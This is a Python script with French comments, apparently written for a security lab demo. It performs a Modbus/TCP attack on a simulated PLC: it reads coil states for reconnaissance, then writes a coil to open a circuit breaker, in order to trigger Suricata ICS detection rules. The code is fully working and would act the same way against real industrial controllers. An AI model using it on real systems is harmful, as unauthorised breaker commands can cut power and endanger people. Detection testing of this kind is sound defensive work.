#!/usr/bin/env python3
"""
attaque_modbus.py — Simulateur d'attaque ICS/SCADA (pour la démo)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Envoie des commandes Modbus/TCP MALVEILLANTES vers l'automate simulé
(plc_simulator.py). Utilisé UNIQUEMENT en lab, pour déclencher les
règles Suricata ICS et démontrer la réponse graduée du SOC :

  1. reconnaissance : lecture des bobines (repérage des disjoncteurs)
  2. attaque        : écriture d'une bobine → OUVERTURE d'un disjoncteur
                      (coupure d'alimentation) depuis un hôte NON autorisé

⚠️ À n'utiliser QUE sur le lab de démonstration, contre le simulateur.
   Aucune dépendance externe (socket pur).

Usage :
    python3 attaque_modbus.py --target 192.168.10.50            # attaque complète
    python3 attaque_modbus.py --target 192.168.10.50 --scan     # recon seule
    python3 attaque_modbus.py --target 192.168.10.50 --coil 0 --open
"""

import argparse
import socket
import struct
import sys
import time

_tid = 0


def _next_tid():
    global _tid
    _tid = (_tid + 1) & 0xFFFF
    return _tid


def _send(sock, unit, pdu):
    tid = _next_tid()
    mbap = struct.pack(">HHHB", tid, 0, len(pdu) + 1, unit)
    sock.sendall(mbap + pdu)
    header = sock.recv(7)
    if len(header) < 7:
        return None
    _, _, length, _ = struct.unpack(">HHHB", header)
    return sock.recv(length - 1)


def read_coils(sock, unit, start=0, qty=3):
    """0x01 Read Coils — reconnaissance de l'état des disjoncteurs."""
    pdu = struct.pack(">BHH", 0x01, start, qty)
    resp = _send(sock, unit, pdu)
    if not resp or resp[0] != 0x01:
        print("   ↳ pas de réponse exploitable")
        return
    nbytes = resp[1]
    bits = resp[2:2 + nbytes]
    states = []
    for i in range(qty):
        on = bool(bits[i // 8] & (1 << (i % 8))) if bits else False
        states.append(f"coil{start + i}={'ON' if on else 'OFF'}")
    print(f"   ↳ {' '.join(states)}")


def write_coil(sock, unit, addr, on):
    """0x05 Write Single Coil — OUVRE ou FERME un disjoncteur."""
    value = 0xFF00 if on else 0x0000
    pdu = struct.pack(">BHH", 0x05, addr, value)
    resp = _send(sock, unit, pdu)
    action = "FERMETURE" if on else "OUVERTURE (COUPURE)"
    if resp and resp[0] == 0x05:
        print(f"   ↳ ✅ {action} du disjoncteur {addr} ACCEPTÉE par l'automate")
    else:
        print(f"   ↳ réponse inattendue : {resp!r}")


def main():
    ap = argparse.ArgumentParser(description="Attaque Modbus de démonstration (lab)")
    ap.add_argument("--target", required=True, help="IP de l'automate cible")
    ap.add_argument("--port", type=int, default=502)
    ap.add_argument("--unit", type=int, default=1)
    ap.add_argument("--scan", action="store_true", help="reconnaissance seule (lecture)")
    ap.add_argument("--coil", type=int, default=0, help="disjoncteur à manipuler")
    ap.add_argument("--open", dest="open_", action="store_true",
                    help="ouvrir (couper) au lieu du scénario complet")
    args = ap.parse_args()

    print("═════════════════════════════════════════════")
    print(f"  ATTAQUE MODBUS (DÉMO) → {args.target}:{args.port}")
    print("═════════════════════════════════════════════")

    try:
        sock = socket.create_connection((args.target, args.port), timeout=5)
    except OSError as e:
        print(f"❌ Connexion impossible : {e}")
        sys.exit(1)

    try:
        print("[1] Reconnaissance — lecture de l'état des disjoncteurs (0x01)")
        read_coils(sock, args.unit, 0, 3)
        time.sleep(1)

        if args.scan:
            print("Mode --scan : reconnaissance uniquement.")
            return

        if args.open_:
            print(f"[2] Attaque ciblée — ouverture du disjoncteur {args.coil}")
            write_coil(sock, args.unit, args.coil, on=False)
            return

        # Scénario complet : couper la ligne 1 puis vérifier
        print(f"[2] Attaque — OUVERTURE du disjoncteur {args.coil} (0x05, écriture non autorisée)")
        write_coil(sock, args.unit, args.coil, on=False)
        time.sleep(1)
        print("[3] Vérification — relecture de l'état")
        read_coils(sock, args.unit, 0, 3)
    finally:
        sock.close()
        print("─────────────────────────────────────────────")
        print("Fin. Vérifier l'alerte ICS/SCADA côté SOC (Telegram /attente).")


if __name__ == "__main__":
    main()
